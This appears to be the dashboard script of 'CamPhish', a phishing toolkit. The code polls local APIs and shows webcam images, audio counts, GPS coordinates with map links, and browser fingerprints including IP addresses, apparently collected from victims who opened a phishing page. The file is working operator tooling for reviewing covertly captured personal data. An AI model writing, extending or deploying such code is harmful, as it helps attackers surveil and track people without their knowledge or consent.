/**
 * CamPhish Dashboard JavaScript
 * Author: Rahul Kushwaha
 * Handles dynamic data loading and auto-refresh
 */

// Auto-refresh interval (10 seconds)
const REFRESH_INTERVAL = 10000;

/**
 * Load statistics from the API
 */
async function loadStats() {
    try {
        const response = await fetch('api/get_stats.php');
        if (!response.ok) {
            throw new Error('Failed to fetch stats');
        }
        const data = await response.json();
        
        document.getElementById('images-count').textContent = data.images || 0;
        document.getElementById('locations-count').textContent = data.locations || 0;
        document.getElementById('fingerprints-count').textContent = data.fingerprints || 0;
        document.getElementById('audio-count').textContent = data.audio || 0;
    } catch (error) {
        console.error('Error loading stats:', error);
    }
}

/**
 * Load images from the API
 */
async function loadImages() {
    try {
        const response = await fetch('api/get_images.php');
        if (!response.ok) {
            throw new Error('Failed to fetch images');
        }
        const images = await response.json();
        
        const gallery = document.getElementById('image-gallery');
        
        if (images.length === 0) {
            gallery.innerHTML = '<p class="no-data">No images captured yet</p>';
            return;
        }
        
        gallery.innerHTML = images.map(function(image) {
            // Validate filename format: only allow cam*.png pattern without path separators
            if (!/^cam[a-zA-Z0-9]+\.png$/.test(image)) {
                return '';
            }
            return '<div class="gallery-item">' +
                '<img src="../' + encodeURIComponent(image) + '" alt="Captured image" loading="lazy">' +
                '<div class="image-name">' + escapeHtml(image) + '</div>' +
            '</div>';
        }).join('');
    } catch (error) {
        console.error('Error loading images:', error);
    }
}

/**
 * Load locations from the API
 */
async function loadLocations() {
    try {
        const response = await fetch('api/get_locations.php');
        if (!response.ok) {
            throw new Error('Failed to fetch locations');
        }
        const locations = await response.json();
        
        const locationsList = document.getElementById('locations-list');
        
        if (locations.length === 0) {
            locationsList.innerHTML = '<p class="no-data">No locations captured yet</p>';
            return;
        }
        
        locationsList.innerHTML = locations.map(function(loc) {
            var lat = escapeHtml(String(loc.lat || 'Unknown'));
            var lon = escapeHtml(String(loc.lon || 'Unknown'));
            var accuracy = escapeHtml(String(loc.accuracy || 'Unknown'));
            var mapsUrl = 'https://www.google.com/maps/place/' + encodeURIComponent(loc.lat) + ',' + encodeURIComponent(loc.lon);
            
            return '<div class="location-item">' +
                '<div class="coords">Lat: ' + lat + ', Lon: ' + lon + '</div>' +
                '<div class="accuracy">Accuracy: ' + accuracy + ' meters</div>' +
                '<a href="' + mapsUrl + '" target="_blank" rel="noopener noreferrer" class="map-link">View on Google Maps →</a>' +
            '</div>';
        }).join('');
    } catch (error) {
        console.error('Error loading locations:', error);
    }
}

/**
 * Load fingerprints from the API
 */
async function loadFingerprints() {
    try {
        const response = await fetch('api/get_fingerprints.php');
        if (!response.ok) {
            throw new Error('Failed to fetch fingerprints');
        }
        const fingerprints = await response.json();
        
        const tbody = document.getElementById('fingerprints-body');
        
        if (fingerprints.length === 0) {
            tbody.innerHTML = '<tr><td colspan="5" class="no-data">No fingerprints captured yet</td></tr>';
            return;
        }
        
        tbody.innerHTML = fingerprints.map(function(fp) {
            var timestamp = escapeHtml(fp.timestamp || 'Unknown');
            var ipAddress = escapeHtml(fp.ipAddress || 'Unknown');
            var browser = escapeHtml(fp.browser || fp.userAgent || 'Unknown');
            var platform = escapeHtml(fp.platform || 'Unknown');
            var screen = fp.screenWidth && fp.screenHeight ? 
                escapeHtml(fp.screenWidth + 'x' + fp.screenHeight) : 'Unknown';
            
            return '<tr>' +
                '<td>' + timestamp + '</td>' +
                '<td>' + ipAddress + '</td>' +
                '<td>' + browser + '</td>' +
                '<td>' + platform + '</td>' +
                '<td>' + screen + '</td>' +
            '</tr>';
        }).join('');
    } catch (error) {
        console.error('Error loading fingerprints:', error);
    }
}

/**
 * Escape HTML to prevent XSS attacks
 */
function escapeHtml(text) {
    if (text === null || text === undefined) {
        return '';
    }
    var div = document.createElement('div');
    div.textContent = String(text);
    return div.innerHTML;
}

/**
 * Load all data
 */
function loadAllData() {
    loadStats();
    loadImages();
    loadLocations();
    loadFingerprints();
}

// Initial load when DOM is ready
document.addEventListener('DOMContentLoaded', function() {
    loadAllData();
    
    // Set up auto-refresh every 10 seconds
    setInterval(loadAllData, REFRESH_INTERVAL);
});
